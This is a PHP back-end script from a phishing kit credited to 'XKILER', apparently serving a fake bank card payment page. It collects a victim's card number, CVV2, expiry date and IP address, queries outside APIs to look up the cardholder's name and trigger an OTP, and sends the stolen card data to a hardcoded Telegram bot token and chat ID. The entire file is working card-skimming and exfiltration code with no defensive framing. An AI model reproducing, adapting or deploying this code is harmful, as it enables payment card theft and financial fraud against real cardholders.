
<?php 

/*************
CODED BY <! XKILER ! >
T.ME/X_KILER
CH/X_FISHING
*************/


header("Content-Type: application/json");

function getStringBetween($string, $start, $end)
{
    $string = ' ' . $string;
    $ini    = strpos($string, $start);
    if ($ini == 0)
        return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}

$input       = file_get_contents("php://input");
$json        = json_decode($input, true);


$panchek = strlen($json["pan"]);
if($panchek=='16'){
$pan=$json["pan"];
}

$cvvchek = strlen($json["cvv2"]);
if($cvvchek=='3'||$cvvchek=='4') {
$cvv = $json["cvv2"];
}

$yearchek = strlen($json["year"]);
if($yearchek=='2'){
$year = $json["year"];
}
$monthchek = strlen($json["month"]);
if($monthchek=='2'){
$month = $json["month"];
}

$captchachek=strlen($json["captcha"]);
if($captchachek=='5'){
$captcha=$json["captcha"];
} 





if(isset($pan)&&isset($cvv)&&isset($year)&&isset($month)&&isset($captcha)){
	
if($captcha=='64452'||$captcha=='78806'||$captcha=='65286'||$captcha=='76937'||$captcha=='89471'||$captcha=='82651'||$captcha=='41691'||$captcha=='99266'||$captcha=='85477'||$captcha=='93540'||$captcha=='95221'||$captcha=='51414'||$captcha=='93810'||$captcha=='99986'||$captcha=='81495'||$captcha=='25626'||$captcha=='56728'||$captcha=='05387'||$captcha=='59703'||$captcha=='04928'){


$get=json_decode(file_get_contents("https://api.xkilercode.tk/ApiCodes/name.php?card_number=$pan"),true);  
/********************************/
$status=$get['status'];

if($status == "OK"){

//Name Target 
$name=$get['Name'];
//Famil Target
$lastname=$get['Lastname'];
//Banke Cartesh
$bankname=$get['Bankname'];
/*********************************/


Echo '{"status":"OK"}';

file_get_contents("https://api.xkiler.me/SendOtp/?Key=XKILER&card_number=$pan");

include "time.php" ;
include "functions.php";

$pan1 = substr($pan,0,4);
$pan2 = substr($pan,4,-8);
$pan3 = substr($pan,8,-4);
$pan4 = substr($pan,12);
$cardn = substr($pan,0,-10);
$bankinfo = bank_information($cardn);

	function getUserIP(){
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    return $ip;
}
$ip = getUserIP();

$TOKEN = "1471975521:AAGc8LtZbws3Xfv6PqkeFL23rDGBi975kz8";
$ID = 1457194403;

$Text = "
● #OTP   $bankinfo[1]
-------------- CARD --------------
💳 Card : <code>$pan1$pan2$pan3$pan4</code>
📋 Cvv2 : <code>$cvv</code>
📆 Date : <code>$year</code>/<code>$month</code>

📍 $ip

";
$Text .="\n$bankinfo[0]";

	

file_get_contents("https://api.telegram.org/bot$TOKEN/sendMessage?parse_mode=HTML&chat_id=$ID&text=".urlencode($Text));


 

}else{
Echo '{"status":"INVALID_PAN"}';
}

}else{
Echo '{"status":"INVALID_CAPTCHA"}';
}
}else{

}




/*************
CODED BY <! XKILER ! >
T.ME/X_KILER
CH/X_FISHING
*************/


?>